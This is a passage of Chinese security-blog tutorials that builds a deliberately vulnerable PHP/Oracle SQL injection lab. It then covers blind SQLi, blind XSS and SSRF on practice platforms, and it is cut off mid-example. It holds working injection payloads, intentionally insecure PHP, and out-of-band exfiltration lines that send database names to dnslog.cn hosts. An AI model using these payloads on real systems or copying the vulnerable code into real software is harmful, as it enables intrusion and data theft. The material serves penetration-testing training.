src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539961158-a91d2a49-c1a1-402d-a3a8-3b8a5cbb8620.png#align=left&display=inline&height=397&margin=%5Bobject%2Object%5D&name=image.png&originHeight=794&originWidth=1872&size=67558&status=done&style=none&width=936\" alt=\"image.png\"><br>在工具 - 选项处<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627539811909-3ea4f232-baa8-491d-8de3-08a44e87ac54.png#align=left&display=inline&height=282&margin=%5Bobject%2Object%5D&name=image.png&originHeight=564&originWidth=1320&size=68308&status=done&style=none&width=660\" alt=\"image.png\"><br>修改oci环境，选择之前数据库安装的路径，修改完后记得重启<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540060849-0839d8a1-10c0-4b49-ba35-cd70e3a7c14b.png#align=left&display=inline&height=597&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1194&originWidth=1536&size=79187&status=done&style=none&width=768\" alt=\"image.png\"><br>2、连接数据库之后，选择相应的用户，我这里是SYSTEM<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540125339-60483bd9-5527-46c5-9fc2-b2394ddd0722.png#align=left&display=inline&height=195&margin=%5Bobject%2Object%5D&name=image.png&originHeight=390&originWidth=946&size=30183&status=done&style=none&width=473\" alt=\"image.png\"><br>3、新建表TEST，设置如下字段<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540264141-c9cb7b96-558b-4cef-b015-5c25e97bd8d7.png#align=left&display=inline&height=301&margin=%5Bobject%2Object%5D&name=image.png&originHeight=602&originWidth=1628&size=58227&status=done&style=none&width=814\" alt=\"image.png\"><br>4、添加如下数据（数据其实是任意的，随意添加即可）<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540925893-509b0585-e42c-437f-a8cf-6d178dd23d4b.png#align=left&display=inline&height=235&margin=%5Bobject%2Object%5D&name=image.png&originHeight=470&originWidth=1358&size=43179&status=done&style=none&width=679\" alt=\"image.png\"><br>5、新建查询进行验证<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627540945678-0b57f457-592c-4efd-aa13-a5ca5033ea8f.png#align=left&display=inline&height=457&margin=%5Bobject%2Object%5D&name=image.png&originHeight=914&originWidth=1530&size=59045&status=done&style=none&width=765\" alt=\"image.png\"><br>以上漏洞数据就简单搭建成功了。</p>\n<h2 id=\"2、搭建PHP站点\"><a href=\"#2、搭建PHP站点\" class=\"headerlink\" title=\"2、搭建PHP站点\"></a>2、搭建PHP站点</h2><p>1、将源码保存为oracle.php文件，放到C:\\phpStudy\\WWW目录下<br>源码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">  header(<span class=\"string\">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\">  <span class=\"variable\">$id</span> = @<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>];</span><br><span class=\"line\">  <span class=\"variable\">$dbstr</span> =<span class=\"string\">&quot;(DESCRIPTION =(ADDRESS = (PROTOCOL = TCP)(HOST =127.0.0.1)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = orcl) (INSTANCE_NAME = orcl)))&quot;</span>; <span class=\"comment\">//连接数据库的参数配置 </span></span><br><span class=\"line\">  <span class=\"variable\">$conn</span> = oci_connect(<span class=\"string\">&#x27;system&#x27;</span>,<span class=\"string\">&#x27;root&#x27;</span>,<span class=\"variable\">$dbstr</span>);<span class=\"comment\">//连接数据库，前两个参数分别是账号和密码</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"variable\">$conn</span>)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"variable\">$Error</span> = oci_error();<span class=\"comment\">//错误信息</span></span><br><span class=\"line\">    <span class=\"keyword\">print</span> htmlentities(<span class=\"variable\">$Error</span>[<span class=\"string\">&#x27;message&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h3&gt;Oracle 注入测试靶场&lt;/h3&gt;&quot;</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from TEST where id=&quot;</span>.<span class=\"variable\">$id</span>;<span class=\"comment\">//sql查询语句</span></span><br><span class=\"line\">\t  <span class=\"keyword\">echo</span> <span class=\"string\">&quot;当前sql语句为：&quot;</span>.<span class=\"variable\">$sql</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>.<span class=\"string\">&quot;&lt;br&gt;&quot;</span>;<span class=\"comment\">//输出sql查询语句</span></span><br><span class=\"line\">    <span class=\"variable\">$ora_b</span> = oci_parse(<span class=\"variable\">$conn</span>,<span class=\"variable\">$sql</span>);  <span class=\"comment\">//编译sql语句 </span></span><br><span class=\"line\">    oci_execute(<span class=\"variable\">$ora_b</span>,OCI_DEFAULT);  <span class=\"comment\">//执行 </span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"variable\">$r</span>=oci_fetch_row(<span class=\"variable\">$ora_b</span>))  <span class=\"comment\">//取回结果 </span></span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">      <span class=\"variable\">$i</span>=<span class=\"number\">0</span>;</span><br><span class=\"line\">      <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Id:&quot;</span>.<span class=\"variable\">$r</span>[<span class=\"variable\">$i</span>++].<span class=\"string\">&quot;  &lt;/t&gt; &lt;br&gt;&quot;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Name:&quot;</span>.<span class=\"variable\">$r</span>[<span class=\"variable\">$i</span>++].<span class=\"string\">&quot;  &lt;/t&gt;&lt;br&gt;  &quot;</span>;</span><br><span class=\"line\">      <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Age:&quot;</span>.<span class=\"variable\">$r</span>[<span class=\"variable\">$i</span>++].<span class=\"string\">&quot;  &lt;/t&gt;&lt;br&gt;  &quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  oci_close(<span class=\"variable\">$conn</span>);<span class=\"comment\">//关闭连接</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>2、访问<a href=\"http://localhost/oracle.php?id=1\">http://localhost/oracle.php?id=1</a>，返回如下界面表示搭建成功，数据库也成功连接了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541521049-4e04787c-15b8-4686-a485-d5d2e03e9f3f.png#align=left&display=inline&height=340&margin=%5Bobject%2Object%5D&name=image.png&originHeight=680&originWidth=1342&size=55565&status=done&style=none&width=671\" alt=\"image.png\"></p>\n<h1 id=\"0x05-Oracle注入测试\"><a href=\"#0x05-Oracle注入测试\" class=\"headerlink\" title=\"0x05 Oracle注入测试\"></a>0x05 Oracle注入测试</h1><h2 id=\"1、检测漏洞点\"><a href=\"#1、检测漏洞点\" class=\"headerlink\" title=\"1、检测漏洞点\"></a>1、检测漏洞点</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=1 and 1=1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541538885-aab0d8c4-aafa-4511-897d-ab85f13130e2.png#align=left&display=inline&height=261&margin=%5Bobject%2Object%5D&name=image.png&originHeight=522&originWidth=1176&size=46725&status=done&style=none&width=588\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=1 and 1=2</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541558550-37db5cd6-20ef-4b68-a731-38eca533e8fb.png#align=left&display=inline&height=222&margin=%5Bobject%2Object%5D&name=image.png&originHeight=444&originWidth=1072&size=38860&status=done&style=none&width=536\" alt=\"image.png\"></p>\n<h2 id=\"2、显错注入\"><a href=\"#2、显错注入\" class=\"headerlink\" title=\"2、显错注入\"></a>2、显错注入</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=-1 union all select 1,(select user from dual),3,&#x27;4&#x27; from dual --</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627541979564-ea8c20f1-051d-4998-ae63-8cc4c6caf50e.png#align=left&display=inline&height=303&margin=%5Bobject%2Object%5D&name=image.png&originHeight=606&originWidth=1874&size=73845&status=done&style=none&width=937\" alt=\"image.png\"></p>\n<h2 id=\"3、报错注入\"><a href=\"#3、报错注入\" class=\"headerlink\" title=\"3、报错注入\"></a>3、报错注入</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=-1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) --</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542108099-2a4e87d2-214a-4809-9762-24e01b40471b.png#align=left&display=inline&height=305&margin=%5Bobject%2Object%5D&name=image.png&originHeight=610&originWidth=2068&size=150069&status=done&style=none&width=1034\" alt=\"image.png\"></p>\n<h2 id=\"4、布尔盲注\"><a href=\"#4、布尔盲注\" class=\"headerlink\" title=\"4、布尔盲注\"></a>4、布尔盲注</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=1 and 1=(select decode(user,&#x27;SYSTEM&#x27;,1,0) from dual) --</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542211017-7bbd5646-d87a-496e-abef-d67b929449ac.png#align=left&display=inline&height=348&margin=%5Bobject%2Object%5D&name=image.png&originHeight=696&originWidth=1774&size=76159&status=done&style=none&width=887\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=1 and 1=(select decode(user,&#x27;SSSSS&#x27;,1,0) from dual) --</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542229391-54e9c196-437c-464a-a1ee-565b21ccee2b.png#align=left&display=inline&height=174&margin=%5Bobject%2Object%5D&name=image.png&originHeight=574&originWidth=1752&size=66181&status=done&style=none&width=532\" alt=\"image.png\"></p>\n<h2 id=\"5、延时盲注\"><a href=\"#5、延时盲注\" class=\"headerlink\" title=\"5、延时盲注\"></a>5、延时盲注</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) --</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542453679-5c200dec-7af1-485d-91a1-5230c4724937.png#align=left&display=inline&height=424&margin=%5Bobject%2Object%5D&name=image.png&originHeight=848&originWidth=2060&size=180765&status=done&style=none&width=1030\" alt=\"image.png\"></p>\n<h2 id=\"6、外带数据\"><a href=\"#6、外带数据\" class=\"headerlink\" title=\"6、外带数据\"></a>6、外带数据</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//localhost/oracle.php?id=1 and (select utl_inaddr.get_host_address((select user from dual)||&#x27;.pgx519.dnslog.cn&#x27;) from dual)is not null --</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542575557-283cc745-e90e-4d49-a82d-4d9aa836531d.png#align=left&display=inline&height=295&margin=%5Bobject%2Object%5D&name=image.png&originHeight=590&originWidth=2062&size=88703&status=done&style=none&width=1031\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627542587192-62e5df2a-2158-4204-8430-3f154aa27d6f.png#align=left&display=inline&height=402&margin=%5Bobject%2Object%5D&name=image.png&originHeight=804&originWidth=1650&size=109880&status=done&style=none&width=825\" alt=\"image.png\"></p>\n<h1 id=\"0x06-总结\"><a href=\"#0x06-总结\" class=\"headerlink\" title=\"0x06 总结\"></a>0x06 总结</h1><p>Oracle数据库注入测试只是简单测试了各种注入到效果，具体测试详情可以看我之前写的文章《Oracle数据库注入总结》。<br>之前因为测试漏洞的时候没有找到很好的在线测试平台，并且自己搭建的时候遇到了各种各样的问题，这里解决问题后写成文章，希望对于想自己搭建注入靶场的安全从业人员有所帮助～</p>\n"},{"title":"PHP无回显渗透测试总结","keywords":"web安全,无回显,PHP,渗透测试","description":"关于一些PHP无回显的渗透测试总结","cover":"/images/phpwhx.png","date":"2021-07-02T02:45:41.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n> 本文已发布到先知社区：https://xz.aliyun.com/t/9916\n>\n> 作者：ajie\n\n# 0x01前言\n\n在渗透测试过程中，开发不可能每一次都将结果输出到页面上，也就是漏洞无回显的情况，那么在这种情况下，我们可以通过dnslog判断漏洞存在，或者通过起一个python的http服务来判断，方法很多，下面主要进行一些情况的分析。\n# 0x02无回显概念\n无回显，即执行的payload在站点没有输出，无法进行进一步操作。在渗透测试过程中，漏洞点不可能总是能够在返回页面进行输出，那么这时候就需要进行一些无回显利用了。\n# 0x03不同漏洞的无回显\n## 1、SQL注入无回显\nSQL注入，作为OWASP常年占据榜首位置的漏洞，在无回显中也是常见的。当然SQL注入在无回显上已经具有了一定的解决措施。\n无回显我将其定义为页面没有输出我们想要得到的内容，下面以sqli-labs为例进行讲解。\n### 1.1 布尔盲注\n       布尔盲注，盲注的一种，当网站通过查询语句的布尔值返回真假来输出页面信息的时候，查询语句为真，页面输出内容；查询语句为假，页面不输出内容。那么这里就可以通过构造等号判断，获取相应的字符的ascii码，最后还原出数据。具体测试过程如下：\n1、id传参1之后，页面返回有数据，这里明显不能进行显错注入了。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152244-ad7b9b8a-6ea0-4cdd-a3e0-0a5eb45ed92f.png#align=left&display=inline&height=156&margin=%5Bobject%2Object%5D&originHeight=315&originWidth=837&status=done&style=none&width=415)\n2、在传参后面加个单引号，页面返回空，不显示错误信息，不能使用报错注入。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152514-71e97518-c208-4b9d-9a4e-61b1dcf4357f.png#align=left&display=inline&height=165&margin=%5Bobject%2Object%5D&originHeight=319&originWidth=802&status=done&style=none&width=415)\n3、通过拼接and 1=1和and 1=2，发现页面对于布尔值的真与假返回的页面结果也不同。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152745-73cf1785-59ee-4551-9d74-7ba98d2cec44.png#align=left&display=inline&height=153&margin=%5Bobject%2Object%5D&originHeight=290&originWidth=790&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152244-ad7b9b8a-6ea0-4cdd-a3e0-0a5eb45ed92f.png#align=left&display=inline&height=156&margin=%5Bobject%2Object%5D&originHeight=315&originWidth=837&status=done&style=none&width=415)\n\n4、通过length()函数判断数据库库名的长度大于1。\n?id=1' and length(database())>1 %23\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153079-ba58f545-ae61-431e-8818-bc12922659e2.png#align=left&display=inline&height=145&margin=%5Bobject%2Object%5D&originHeight=299&originWidth=856&status=done&style=none&width=415)\n5、在大于8的时候页面返回空，所以数据库库名长度等于8。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153336-eed66eb5-75a1-4e17-b7fe-a758a9223de1.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&originHeight=299&originWidth=847&status=done&style=none&width=415)\n6、通过ascii()函数和substr ()截取函数获取数据库库名的第一个字符的ascii码\n?id=1' and ascii(substr((select database()),1,1))>97 %23\n?id=1' and ascii(substr((select database()),1,1))=101 %23\n首先用大于号判断出大概所处的值，最后使用等于号验证ascii码的值。此处得出数据库库名的第一个字符的ascii码值为115，对应字符为s。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153599-f01e6d2c-ae3c-4f6f-b9ea-1f7fe4b77bdc.png#align=left&display=inline&height=148&margin=%5Bobject%2Object%5D&originHeight=310&originWidth=871&status=done&style=none&width=415)\n7、更改截取的位置，判断后面的字符对应的ascii码值。\n?id=1' and ascii(substr((select database()),2,1))=101 %23\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153874-95d56f80-1ac9-4a44-93a7-b4d8f7c63939.png#align=left&display=inline&height=147&margin=%5Bobject%2Object%5D&originHeight=287&originWidth=810&status=done&style=none&width=416)\n### 1.2 延时盲注\n       延时盲注，一种盲注的手法。在渗透测试过程中当我们不能使用显错注入、报错注入以及布尔盲注无论布尔值为真还是为假，页面都返回一样之后，我们可以尝试使用延时盲注，通过加载页面的时间长度来判断数据是否成功。在PHP中有一个if()函数，语法为if(exp1,exp2,exp3)，当exp1返回为真时，执行exp2，返回为假时，执行exp3。配合延时函数sleep()来获取相应数据的ascii码，最后还原成数据。下面我将通过实例来介绍如今进行延时盲注。\n1、首先获取的页面如下，后面不论接上布尔值为真还是为假的，页面都返回一样，此时将不能使用布尔盲注。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505154171-53cd2d36-c123-4091-ba74-fb80319ba1f9.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&originHeight=277&originWidth=785&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505154477-058cbb12-c306-42db-8afd-7b9c0b26dd87.png#align=left&display=inline&height=154&margin=%5Bobject%2Object%5D&originHeight=295&originWidth=796&status=done&style=none&width=416)\n2、通过and拼接延时函数查看页面是否有延时回显。首先记录没有使用延时函数的页面返回时间，为4.*秒；使用sleep(5)延时5秒之后，页面响应时间为9.*秒，说明对于我们输入的sleep()函数进行了延时处理，此处存在延时盲注。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505154774-5573d6ac-4de8-4808-b813-7c983b1e63a3.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&originHeight=418&originWidth=1448&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505155245-cac61cf1-0e9f-41cf-a967-182f57ac1554.png#align=left&display=inline&height=116&margin=%5Bobject%2Object%5D&originHeight=382&originWidth=1371&status=done&style=none&width=415)\n3、通过延时注入判断数据库库名的长度。一个个测试发现当长度等于8时页面延时返回了，说明数据库库名长度为8。\n?id=2' and if((length(database())=8),sleep(5),1) %23\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505155513-36485f8a-abee-4402-a197-44636b0a2f86.png#align=left&display=inline&height=167&margin=%5Bobject%2Object%5D&originHeight=434&originWidth=1081&status=done&style=none&width=415)\n4、与布尔盲注一样，将子查询的数据截断之后判断ascii码，相等时延时5秒。最后得到第一个字符的ascii码为115。\n?id=2' and if((ascii(substr((select database()),1,1))=115),sleep(5),1) %23\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505155940-da473dc6-2ac2-4ec1-b180-7c6456d0de47.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&originHeight=423&originWidth=1220&status=done&style=none&width=415)\n5、后面替换截断的位置，测试后面的字符的ascii码值。最后得到对应的ascii码值为115 101 99 117 114 105 116 121。通过ascii解码工具解得数据库库名为security。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505156315-650ab5b8-b418-4536-bc9e-ba70ca07f13c.png#align=left&display=inline&height=286&margin=%5Bobject%2Object%5D&originHeight=477&originWidth=666&status=done&style=none&width=400)\n### 巧用dnslog进行SQL注入\n       前面介绍了SQL注入中的盲注，通过布尔盲注或者延时盲注来获取数据需要的步骤非常繁琐，不仅需要一个一个字符的获取，最后还需要进行ascii解码，这需要花费大量的时间与精力。为了加快渗透进程，以及降低获取数据的难度，这里介绍如何通过dnslog进行SQL注入。\n#### Dnslog\n       dnslog，即dns日志，会解析访问dns服务的记录并显示出来，常被用来测试漏洞是否存在以及无法获取数据的时候进行外带数据。简单来说，dnslog就是一个服务器，会记录所有访问它的记录，包括访问的域名、访问的IP以及时间。那么我们就可以通过子查询，拼接dnslog的域名，最后通过dns日志得到需要的数据。\n#### Load_file()函数\n       数据库中的load_file()函数，可以加载服务器中的内容。load_file('c:/1.txt')，读取文件并返回内容为字符串，使用load_file()函数获取数据需要有以下几个条件：\n       1.文件在服务器上\n       2.指定完整路径的文件\n       3.必须有FILE权限\n#### UNC路径\n       UNC路径就是类似\\\\softer这样的形式的网络路径。它符合 **\\\\服务器名\\服务器资源**的格式。在Windows系统中常用于共享文件。如\\\\192.168.1.1\\共享文件夹名。\n#### Dnslog注入实例演示\n1、打开实例站点，很明显这里是只能使用盲注的站点。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505156851-edecb966-dc2b-46c0-bbba-280a9a6586f7.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&originHeight=516&originWidth=1046&status=done&style=none&width=415)\n2、通过order by判断出字段数为3。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505157359-df1d201d-8e3f-4ae7-abad-93e6f6a15a3a.png#align=left&display=inline&height=238&margin=%5Bobject%2Object%5D&originHeight=451&originWidth=785&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505157735-72a8dfd4-3a1d-4bcb-a55f-ff7862eef954.png#align=left&display=inline&height=228&margin=%5Bobject%2Object%5D&originHeight=448&originWidth=814&status=done&style=none&width=415)\n3、在dnslog网站申请一个dnslog域名：pcijrt.dnslog.cn\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505158068-3fd1f43e-d354-4c51-a466-2c88660f7ff9.png#align=left&display=inline&height=166&margin=%5Bobject%2Object%5D&originHeight=413&originWidth=1035&status=done&style=none&width=415)\n4、通过load_file函数拼接查询数据库库名的子查询到dnslog的域名上，后面任意接一个不存在的文件夹名。最后将这个查询放到联合查询中，构造的payload如下：\n```http\n?id=1 ' union select 1,2,load_file(concat('//',(select database()),'.pcijrt.dnslog.cn\n/abc')) %23\n```\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505158457-b4c723f7-cdba-43c0-9fc4-5d284d9f1728.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&originHeight=413&originWidth=1189&status=done&style=none&width=415)\n5、执行语句之后在dnslog日志中获取到数据库库名为security。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505158874-723d612b-a6df-4d1d-a38b-98cf9036ddcb.png#align=left&display=inline&height=168&margin=%5Bobject%2Object%5D&originHeight=434&originWidth=1072&status=done&style=none&width=415)\n6、修改子查询里的内容，获取其他数据。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505159168-1cca463c-9c90-42db-822d-f944b8727a1f.png#align=left&display=inline&height=185&margin=%5Bobject%2Object%5D&originHeight=537&originWidth=1209&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505159492-cc5dc626-b30c-4763-8fb0-f6285add8085.png#align=left&display=inline&height=166&margin=%5Bobject%2Object%5D&originHeight=490&originWidth=1227&status=done&style=none&width=415)\n\n\n## 2、XSS无回显\nXSS无回显比较特殊，一般XSS漏洞的判断标准为弹框，但是有这样一种情况，在一个表单提交处，内容提交之后只会在页面显示提交成功与否，不会输出提交的内容，那么我们也就无法通过弹框来判断XSS漏洞存在与否。这时候就需要通过XSS盲打来进行攻击。下面通过Pikachu漏洞练习平台来进行实例讲解：\n### 2.1 XSS盲打\n1、如图这里是一个提交看法的功能\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505159770-c89b0ec9-0436-4cf8-8f14-803ac998a67e.png#align=left&display=inline&height=171&margin=%5Bobject%2Object%5D&originHeight=500&originWidth=1217&status=done&style=none&width=415)\n2、随便输入内容提交，告诉我们提交成功，没有将我输入的内容返回到页面中\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160001-28ff893d-98ad-43cc-b6a4-3c8c2f982dc9.png#align=left&display=inline&height=207&margin=%5Bobject%2Object%5D&originHeight=345&originWidth=569&status=done&style=none&width=341)\n3、登录后台可以看到确实有数据回显\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160252-54df82c0-b513-4071-b4fa-8f2716f4514a.png#align=left&display=inline&height=82&margin=%5Bobject%2Object%5D&originHeight=317&originWidth=1617&status=done&style=none&width=416)\n4、输入弹框语句会在后台成功执行\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160525-58331697-af8f-4fe1-a420-f170f43cb0d6.png#align=left&display=inline&height=128&margin=%5Bobject%2Object%5D&originHeight=362&originWidth=1175&status=done&style=none&width=415)\n5、在渗透测试过程中我们无法登录后台进行查看，那么就需要盲打XSS，输入XSS平台的payload，坐等管理员查看内容后上钩。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160770-d75465c1-9a36-4a5f-bb0f-0256f7108eea.png#align=left&display=inline&height=235&margin=%5Bobject%2Object%5D&originHeight=395&originWidth=699&status=done&style=none&width=415)\n### 2.2 通过dnslog判断漏洞存在\n```http\npayload:\n<img src=http://xss.t7y3wc.dnslog.cn>\n```\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626688564769-dcba54f1-6694-483e-bbb0-2ef4287b50e8.png#align=left&display=inline&height=294&margin=%5Bobject%2Object%5D&name=image.png&originHeight=588&originWidth=742&size=40726&status=done&style=none&width=371)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1626688575999-b7c4d322-0f4c-49a4-9da1-496c6dbc6b13.png#align=left&display=inline&height=223&margin=%5Bobject%2Object%5D&name=image.png&originHeight=446&originWidth=1636&size=54194&status=done&style=none&width=818)\n## 3、SSRF无回显\nSSRF即服务端请求伪造，一种由攻击者构造的通过服务器发起请求的攻击。\n测试代码如下：\n```php\n<?php \n\techo file_get_contents($_GET['url']);\n?>\n```\n首先通过访问百度可以验证漏洞存在\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011741087-fbffd788-bf83-4b17-90e6-c147539273c9.png#align=left&display=inline&height=343&margin=%5Bobject%2Object%5D&name=image.png&originHeight=686&originWidth=1722&size=49389&status=done&style=none&width=861)\n无回显情况即不进行输出，页面返回空\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011767609-826cc500-1e74-42fc-bb0a-e205fd70abb9.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=812&size=9552&status=done&style=none&width=406)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011778291-6d43af3c-3612-4913-a7a4-98d96252c5ee.png#align=left&display=inline&height=129&margin=%5Bobject%2Object%5D&name=image.png&originHeight=258&originWidth=1002&size=18063&status=done&style=none&width=501)\n这种情况可以通过dnslog或者python搭建http服务验证\n1、DNSLOG\n[http://172.16.29.2/ssrf_test.php?url=http://ssrf.02c6ot.dnslog.cn](http://172.16.29.2/ssrf_test.php?url=http://ssrf.02c6ot.dnslog.cn)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011861845-ebd9644c-a3d9-4fbd-8777-4c96a1ce90f7.png#align=left&display=inline&height=179&margin=%5Bobject%2Object%5D&name=image.png&originHeight=358&originWidth=1518&size=40848&status=done&style=none&width=759)\n2、python起的http服务\n\n```php\npython3 -m http.server 